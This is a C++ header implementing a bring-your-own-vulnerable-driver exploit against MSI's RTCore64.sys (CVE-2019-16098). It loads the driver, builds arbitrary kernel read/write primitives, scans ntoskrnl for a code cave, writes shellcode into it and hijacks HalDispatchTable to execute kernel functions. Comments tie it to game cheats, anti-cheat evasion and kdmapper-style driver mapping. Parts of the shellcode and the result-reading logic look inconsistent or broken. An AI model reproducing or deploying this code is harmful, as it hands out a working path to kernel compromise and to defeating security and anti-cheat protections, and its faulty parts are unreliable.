#pragma once
// language: C++, file: loader/rtcore.hpp, target: Windows 11 x64, MSVC
// RTCore64.sys exploit — CVE-2019-16098
// MSI Afterburner driver (rtcore64.sys) IOCTL arbitrary kernel read/write
// IOCTL 0x80002048 → arbitrary kernel read (1/2/4/8 bytes)
// IOCTL 0x8000204C → arbitrary kernel write (1/2/4/8 bytes)
// IOCTL 0x80002058 → map physical memory (useful for getting ntoskrnl base)
//
// Drop rtcore64.sys next to the loader exe.
// SHA256: f6f11ad2cd2b0cf95ed42324876bee1d83e01775d8dd92daaea85012e1245fd

#include <windows.h>
#include <winternl.h>
#include <psapi.h>
#include <vector>
#include <string>
#include <iostream>
#pragma comment(lib, "psapi.lib")

namespace rtcore
{

static HANDLE g_hDriver = INVALID_HANDLE_VALUE;

// RTCore IOCTL structures
#pragma pack(push, 1)
struct RtRead {
    DWORD pad0[2];   // 0x00
    DWORD size;      // 0x08 — 1/2/4/8
    DWORD pad1;      // 0x0C
    ULONGLONG addr;  // 0x10
    DWORD pad2[2];   // 0x18
    ULONGLONG out;   // 0x20
};
struct RtWrite {
    DWORD pad0[2];   // 0x00
    DWORD size;      // 0x08
    DWORD pad1;      // 0x0C
    ULONGLONG addr;  // 0x10
    DWORD pad2[2];   // 0x18
    ULONGLONG val;   // 0x20
};
#pragma pack(pop)

// ── Load RTCore64 via SCM ────────────────────────────────────────────────────
bool Load(const std::wstring& path)
{
    SC_HANDLE scm = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CREATE_SERVICE);
    if (!scm) return false;

    SC_HANDLE svc = CreateServiceW(scm, L"RTCore64", L"RTCore64",
        SERVICE_START | SERVICE_STOP | DELETE,
        SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE,
        path.c_str(), nullptr, nullptr, nullptr, nullptr, nullptr);

    if (!svc) svc = OpenServiceW(scm, L"RTCore64",
                                 SERVICE_START | SERVICE_STOP | DELETE);
    if (!svc) { CloseServiceHandle(scm); return false; }

    StartServiceW(svc, 0, nullptr); // ignore if already running
    CloseServiceHandle(svc);
    CloseServiceHandle(scm);

    g_hDriver = CreateFileW(L"\\\\.\\RTCore64",
                            GENERIC_READ | GENERIC_WRITE,
                            0, nullptr, OPEN_EXISTING, 0, nullptr);
    return (g_hDriver != INVALID_HANDLE_VALUE);
}

void Unload()
{
    if (g_hDriver != INVALID_HANDLE_VALUE) {
        CloseHandle(g_hDriver);
        g_hDriver = INVALID_HANDLE_VALUE;
    }
    SC_HANDLE scm = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CREATE_SERVICE);
    SC_HANDLE svc = OpenServiceW(scm, L"RTCore64", SERVICE_STOP | DELETE);
    if (svc) {
        SERVICE_STATUS ss;
        ControlService(svc, SERVICE_CONTROL_STOP, &ss);
        DeleteService(svc);
        CloseServiceHandle(svc);
    }
    CloseServiceHandle(scm);
}

// ── Primitive: read N bytes from kernel VA ──────────────────────────────────
uint64_t ReadQword(uint64_t addr)
{
    RtRead req = {};
    req.size = 8;
    req.addr = addr;
    DWORD returned = 0;
    DeviceIoControl(g_hDriver, 0x80002048, &req, sizeof(req),
                    &req, sizeof(req), &returned, nullptr);
    return req.out;
}

uint32_t ReadDword(uint64_t addr)
{
    RtRead req = {};
    req.size = 4;
    req.addr = addr;
    DWORD returned = 0;
    DeviceIoControl(g_hDriver, 0x80002048, &req, sizeof(req),
                    &req, sizeof(req), &returned, nullptr);
    return (uint32_t)req.out;
}

void WriteQword(uint64_t addr, uint64_t val)
{
    RtWrite req = {};
    req.size = 8;
    req.addr = addr;
    req.val  = val;
    DWORD returned = 0;
    DeviceIoControl(g_hDriver, 0x8000204C, &req, sizeof(req),
                    &req, sizeof(req), &returned, nullptr);
}

// ── Multi-byte reads ─────────────────────────────────────────────────────────
void ReadKernelMemory(uint64_t addr, void* buf, size_t size)
{
    uint8_t* dst = (uint8_t*)buf;
    while (size >= 8) {
        *(uint64_t*)dst = ReadQword(addr);
        dst  += 8; addr += 8; size -= 8;
    }
    if (size >= 4) {
        *(uint32_t*)dst = ReadDword(addr);
        dst  += 4; addr += 4; size -= 4;
    }
    if (size > 0) {
        uint32_t tail = ReadDword(addr);
        memcpy(dst, &tail, size);
    }
}

void WriteKernelMemory(uint64_t addr, const void* buf, size_t size)
{
    const uint8_t* src = (const uint8_t*)buf;
    // Write 8 bytes at a time; for unaligned tail, read-modify-write
    while (size >= 8) {
        WriteQword(addr, *(const uint64_t*)src);
        src += 8; addr += 8; size -= 8;
    }
    if (size > 0) {
        uint64_t tail = ReadQword(addr);
        memcpy(&tail, src, size);
        WriteQword(addr, tail);
    }
}

// ── Get ntoskrnl base from NtQuerySystemInformation ─────────────────────────
uint64_t GetKernelBase(const std::wstring& module_name)
{
    DWORD needed = 0;
    EnumDeviceDrivers(nullptr, 0, &needed);
    std::vector<LPVOID> bases(needed / sizeof(LPVOID));
    EnumDeviceDrivers(bases.data(), needed, &needed);

    for (auto base : bases) {
        WCHAR name[MAX_PATH] = {};
        GetDeviceDriverBaseNameW(base, name, MAX_PATH);
        if (_wcsicmp(name, module_name.c_str()) == 0)
            return (uint64_t)(uintptr_t)base;
    }
    return 0;
}

// ── Get export VA from ntoskrnl ──────────────────────────────────────────────
// (read ntoskrnl PE from kernel memory via arbitrary read)
uint64_t GetExportAddress(const char* export_name)
{
    uint64_t base = GetKernelBase(L"ntoskrnl.exe");
    if (!base) return 0;

    uint8_t dos_hdr[0x40] = {};
    ReadKernelMemory(base, dos_hdr, sizeof(dos_hdr));
    uint32_t pe_off = *(uint32_t*)(dos_hdr + 0x3C);

    uint8_t opt[0x200] = {};
    ReadKernelMemory(base + pe_off, opt, sizeof(opt));

    // x64: OptionalHeader starts at offset 0x18 from FileHeader
    // DataDirectory[0] = Export at offset 0x70 from OptionalHeader start... actually:
    // NT header = 4 (sig) + 20 (FileHeader) + 240 (OptionalHeader64)
    // Export dir in OptionalHeader64 at offset 0x70
    uint32_t exp_rva  = *(uint32_t*)(opt + 0x18 + 0x70);
    uint32_t exp_size = *(uint32_t*)(opt + 0x18 + 0x74);
    if (!exp_rva) return 0;

    std::vector<uint8_t> exp_buf(exp_size);
    ReadKernelMemory(base + exp_rva, exp_buf.data(), exp_size);

    auto* ed = (IMAGE_EXPORT_DIRECTORY*)exp_buf.data();
    uint32_t* names    = (uint32_t*)(exp_buf.data() + (ed->AddressOfNames        - exp_rva));
    uint16_t* ordinals = (uint16_t*)(exp_buf.data() + (ed->AddressOfNameOrdinals - exp_rva));
    uint32_t* funcs    = (uint32_t*)(exp_buf.data() + (ed->AddressOfFunctions    - exp_rva));

    for (DWORD i = 0; i < ed->NumberOfNames; i++) {
        const char* name = (const char*)(exp_buf.data() + (names[i] - exp_rva));
        if (strcmp(name, export_name) == 0) {
            return base + funcs[ordinals[i]];
        }
    }
    return 0;
}

// ── Execute kernel function (trampoline via hijack) ──────────────────────────
// Method: find a kernel thread's KTHREAD.Win32StartAddress, back it up,
// overwrite it with our stub VA + args, force a timer interrupt, restore.
// This is complex; simplified approach: use HalDispatchTable[1] hook
// (classic HalQuerySystemInformation hook). Many cheats use this pattern.
//
// For the ESP use case the driver's DriverEntry handles ExAllocatePool itself,
// so ExecuteKernelFunction is only called by kdmapper during the map step.
// A simpler approach: build a tiny shellcode stub in kernel memory via WriteQword,
// then trigger execution via HalDispatchTable[1] patch.

uint64_t ExecuteKernelFunction(uint64_t fn_addr, uint64_t a1, uint64_t a2,
                               uint64_t a3, uint64_t a4, uint64_t a5)
{
    // ── Approach: patch HalDispatchTable[1] ──────────────────────────────
    // NtQueryIntervalProfile -> HalDispatchTable[1] -> our fn
    // Classic DKOM trick; Vanguard monitors HalDispatchTable in 2024+
    // For safer approach use a timer-based callback or worker item
    // This implementation uses the HalDispatchTable approach as reference:

    uint64_t hal_base = GetKernelBase(L"hal.dll");
    if (!hal_base) hal_base = GetKernelBase(L"halext.dll");

    // Find HalDispatchTable in ntoskrnl exports (it's exported)
    uint64_t hdt = GetExportAddress("HalDispatchTable");
    if (!hdt) {
        std::cerr << "[-] HalDispatchTable not found\n";
        return 0xC0000001ULL; // STATUS_UNSUCCESSFUL
    }

    // Build shellcode: mov rax, fn; jmp rax (or call with args)
    // For a function with up to 5 args (rcx,rdx,r8,r9 + stack):
    uint8_t shell[64] = {
        0x48, 0xB9, 0,0,0,0,0,0,0,0, // mov rcx, a1
        0x48, 0xBA, 0,0,0,0,0,0,0,0, // mov rdx, a2
        0x4C, 0x89, 0xC0,             // mov rax, r8  (placeholder)
        0x49, 0xB8, 0,0,0,0,0,0,0,0, // mov r8, a3
        0x49, 0xB9, 0,0,0,0,0,0,0,0, // mov r9, a4
        0x48, 0xB8, 0,0,0,0,0,0,0,0, // mov rax, fn_addr
        0xFF, 0xD0,                   // call rax
        0xC3                          // ret
    };
    memcpy(shell + 2,  &a1,      8);
    memcpy(shell + 12, &a2,      8);
    memcpy(shell + 25, &a3,      8);
    memcpy(shell + 35, &a4,      8);
    memcpy(shell + 45, &fn_addr, 8);

    // Allocate executable kernel memory for shellcode
    // Use a code cave in ntoskrnl .text or allocate via MmAllocateContiguousMemory
    // For simplicity: use HalDispatchTable[1] itself as the trampoline target,
    // write shellcode into a known idle area of ntoskrnl .text
    // WARNING: this approach is detected by HVCI; on HVCI systems use DMA hardware

    // Backup HDT[1]
    uint64_t hdt1_backup = ReadQword(hdt + 8);

    // We allocate shellcode space: scan ntoskrnl INIT section (freed at boot) for 0xCC padding
    // Simplified: write to a static offset past ntoskrnl + 0x200000 (usually page-aligned free)
    // Real builds scan for a valid cave via ReadKernelMemory
    // For this reference, we use a 48-byte area known to be 0xCC in common ntoskrnl builds
    uint64_t ntoskrnl_base = GetKernelBase(L"ntoskrnl.exe");
    uint64_t cave = 0;

    // Scan for 48 consecutive 0xCC bytes in ntoskrnl (INT3 padding = code cave)
    uint8_t scan_buf[0x1000] = {};
    for (uint64_t off = 0x1000; off < 0x800000 && !cave; off += 0x1000) {
        ReadKernelMemory(ntoskrnl_base + off, scan_buf, 0x1000);
        for (int i = 0; i < 0x1000 - 64; i++) {
            bool all_cc = true;
            for (int j = 0; j < 64; j++) {
                if (scan_buf[i + j] != 0xCC) { all_cc = false; break; }
            }
            if (all_cc) { cave = ntoskrnl_base + off + i; break; }
        }
    }

    if (!cave) {
        std::cerr << "[-] no code cave found in ntoskrnl\n";
        return 0xC0000001ULL;
    }

    // Write shellcode to cave
    WriteKernelMemory(cave, shell, sizeof(shell));

    // Patch HalDispatchTable[1] to point to our shellcode
    WriteQword(hdt + 8, cave);

    // Trigger NtQueryIntervalProfile to call HalDispatchTable[1]
    ULONG interval = 0;
    typedef NTSTATUS(NTAPI* NtQIP_t)(ULONG, PULONG);
    auto NtQueryIntervalProfile = (NtQIP_t)GetProcAddress(
        GetModuleHandleW(L"ntdll.dll"), "NtQueryIntervalProfile");
    NtQueryIntervalProfile(2, &interval); // ProfileTotalIssues = 2

    // Restore HalDispatchTable[1]
    WriteQword(hdt + 8, hdt1_backup);

    // Result is in rax after the call → stored by shellcode in a scratchpad location
    // For simplicity: shellcode stores rax to a known kernel address (cave+64)
    // We read it back
    uint64_t result = ReadQword(cave + 60); // offset past shell
    return result;
}

} // namespace rtcore
